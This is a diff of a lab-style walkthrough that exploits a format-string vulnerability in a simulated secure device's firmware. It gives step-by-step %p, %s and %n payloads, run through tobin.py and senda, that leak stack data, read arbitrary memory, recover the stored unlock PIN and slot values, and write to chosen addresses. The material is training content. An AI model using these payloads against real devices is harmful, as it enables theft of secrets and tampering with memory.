@@ -13,7 +13,7 @@ Instead of echoing "%d", SD echoes a integer : there is a format string vulnerab
 You can learn values of R1, R2 and R3 registers just before echo (we cannot get R0, which points to the command buffer):
 > senda %p-%p-%p
 < 2000046d-1-20000150
-Note: use %p to retrieve pointer values, and for some reason, you have to separate "%p"s with a character (here "-").
+Note: use %p to retrieve pointer values, and for some reason, when using senda tool, you have to separate "%p"s with a character (here "-").
 You can see here that both R1 and R3 point to SRAM.
 If you add more "%p", you'll start dumping the stack contents
 > senda %p-%p-%p-%p-%p-%p-%p
@@ -26,7 +26,7 @@ There we can stop a bit. The value in R1 looks interesting, because it seems to 
 < 20000467
 > senda -%p
 < -20000468
-Looks like it is the end of the command in memory. This gives us the start of the command buffer (0x20000464) in memory, which can be useful for other attacks.
+Looks like it is the end of the command in memory. This allows us to guess the start of the command buffer (0x20000464) in memory, which can be useful for other attacks.
 
 To get more information, you can also try to output data as string :
 > send %s
@@ -57,53 +57,86 @@ Another thing to try is to crash the application using %d on a bad pointer:
 This gives you plentiful of useful information, like return addresses, addresses of several functions (strlen at 0x08001200-0x1f, printf at 0x08002295, ...)
 It confirms the command buffer address (0x20000464).
 
-Last thing to try with format string : can you also write to memory using %n ?
->senda %n
-<ready
-<
-"%n" is not echoed. Seems it is supported. %n write the value represented by the number of bytes printed so far.
+Reading anywhere
+----------------
 
+As you can see, with %s you can derefence pointers present in the stack and read data they point to.
+Can you exploit this to read anywhere in memory ?
+First, you can observe that after dumping enough stack values, you start to dump the content of the input buffer.
+>senda %p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
+< ready...
+< 20000485-1-20000150-0-0-8002e9c-0-0-8002bdb-20-252d7025
+252d7025 is "%p-%" encoded in ascii.
+Since you control the content of input buffer, you control the pointer in the stack.
 
-To exploit this, you could use another observation:
-If you add more "%p" you endup seeing in the stack the command you sent:
->senda %p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p 
-<20000485-1-20000150-0-0-8002e9c-0-0-8002bdb-20-252d7025
-252d7025 is "%p-%" in ascii
-Or more explicitly :
->senda AAAA%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p 
-<20000485-1-20000150-0-0-8002e9c-0-0-8002bdb-20-41414141
+You can use the tobin.py script and remove the '-':
+> tobin.py %p%p%p%p%p%p%p%p%p%p%p | senda
+< 2000047b120000150008002e9c008002bdb1670257025
 
-So if we try to use %n to write to our 0x41414141 address:
->senda %p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%n 
-<...
-<Trying to write outside mapped memory at address 0x41414141 when PC is 0x80006bc.
-<...
+Now you can add a bad pointer (AAAA, 0x41414141 in binary) to the start of the input buffer. 
+>tobin.py AAAA%p%p%p%p%p%p%p%p%p%p%p | senda
+< AAAA2000047f120000150008002e9c008002bdb1a41414141
+You could try to put a pointer to real memory instead:
+>tobin.py \w20000000%p%p%p%p%p%p%p%p%p%p%p | senda
+< 
 
-The application tried to write to address 0x41414141 !!!
+Unfortunatly, this pointer contains a zero byte, which ends the format string, so it does not work.
+Since all interesting addresses (RAM, flash) contain at least one zero byte, you cannot attack like this.
+One solution is to place the pointer at the end of the input buffer:
 
-Unfortunatly, you cannot use this for any practical exploit. 
-Because all interesting addresses in RAM cointain a zero byte (e.g 0x20**00**0150).
-And since you placed this address at the start of the command buffer, this zero terminates the format string before even the first formatter :(
+>tobin.py %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p__%pAAAA | senda
+< ...255f5f__41414141AAAA
+Here a few "__" were added to better see the result, as well as a lot of %p to point on the end of the buffer.
 
-Ideally, you would need your address to be at the end of the command buffer.
-Thankfully, everytime you add a "%p-" formatter, you increase the command buffer by 3, while at the same time the stack location to be acceded is increased by 4.
-So you should be able to catchup with the end of the buffer with enough formatters:
+Now you can try to dereference this 0x41414141 address to check it works (replace last %p by %s).
+>tobin.py %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p__%sAAAA | senda
+< ...
+< User error: Memory access error:
+< Trying to read outside mapped memory at address 0x41414141 when PC is 0x80011e8.
+You can pick a good pointer:
+>tobin.py %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p__%s\w20000000 | senda
+< ... __?T
+You can read anywhere you want, zero bytes are not an issue anymore. 
+The only problem is %s encodes read in ASCII: 
+- a zero byte terminates reading
+- characters below 32 are difficult to guess 
+But still you can try all possible location in RAM or flash, and see what happens.
 
-If fact you need 42 of them:
->senda %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.AAAA 
-<ready...
-<200004e9.1.20000150.0.0.8002e9c.0.0.8002bdb.84.252e7025.70252e70.2e70252e.252e7025.70252e70.2e70252e.252e7025.70252e70.2e70252e.252e7025.70252e70.2e70252e.252e7025.70252e70.2e70252e.252e7025.70252e70.2e70252e.252e7025.70252e70.2e70252e.252e7025.70252e70.2e70252e.252e7025.70252e70.2e70252e.252e7025.70252e70.2e70252e.252e7025.70252e70.41414141AAAA
-You can see your 0x41414141 ("AAAA") value on the last formatter.
-So if you replace this last "%p" by a "%n":
->senda %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%n.AAAA 
+Reading slot & PIN
+------------------
+
+To find the slots location, you can write a seldom used value in slot 0 and slot 1 ('$' for instance, encoded as 36 in decimal).
+Then you can parse all addresses in RAM until you find those '$' characters. You just need to add write commands before your attack command:
+tobin.py w036 w136 %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p__%s\w20000000 | senda
+
+To save you time, look at your application map file to find directly the correct address for the 'info' variable.
+Here the address is 0x20000130:
+> tobin.py w036 w136 %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p__%s\w20000130 | senda
+< ...__?0?
+Not so interesting, let's try an address slightly after that (0x20000132):
+< __2304$?$?c?d
+You can see two '$' characters. To make sure they really are slot 0 and slot 1 value, you can write different values in these slot and check that the value correspond.
+
+Now you can read all slots, this way, provided slot value are not below 32 (special ASCCI character, often not displayed).
+
+Also, have you noticed the 4 ASCII numeric characters in the last output (2304) ? 
+Could it be the unlock PIN code ? Indeed it is ! You can try to use this PIN to unlock the SD.
+
+Writing anywhere
+----------------
+
+Would it be also possible to create a write anywhere command ? 
+Yes, with %n (which writes the number of characters printed so far to the current parameter).
+>tobin.py %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p__%nAAAA | senda
+< User error: Memory access error:
 < Trying to write outside mapped memory at address 0x41414141 when PC is 0x80006bc.
 
-This time you can really write anywhere, as any zero in your address is not a problem.
+We can write anywhere we want !
 
-Still, there are three issues:
-One, you have a limited control over the value to write. The value is the number of bytes printed, so a very low number like zero would be impossible, and a high value like a pointer also.
-Two, where to write ? Without the binary code, you would have to poke in the dark, hoping to overwrite some interesting data. 
-Three, the SD crashes after the exploit. Because of a buffer overflow. So any modification you could achieve would be gone next time you restart. To go further you would need to control the buffer overflow, but if you can do that it buffer overflow would be much easier to exploit to write where you want.
+Still, three issues make exploiting this difficult:
+1. You have a limited control over the value to write. The value is the number of bytes printed, so a very low number like zero would be impossible, and a high value like a pointer also.
+2. Where to write ? Without the binary code, you would have to poke in the dark, hoping to overwrite some interesting data. 
+3. The SD crashes after the exploit, because of a buffer overflow. So any modification you could achieve would be gone next time you restart. To go further you would need to control the buffer overflow, but if you can do that it buffer overflow would be much easier to exploit to write where you want.
 
 
 
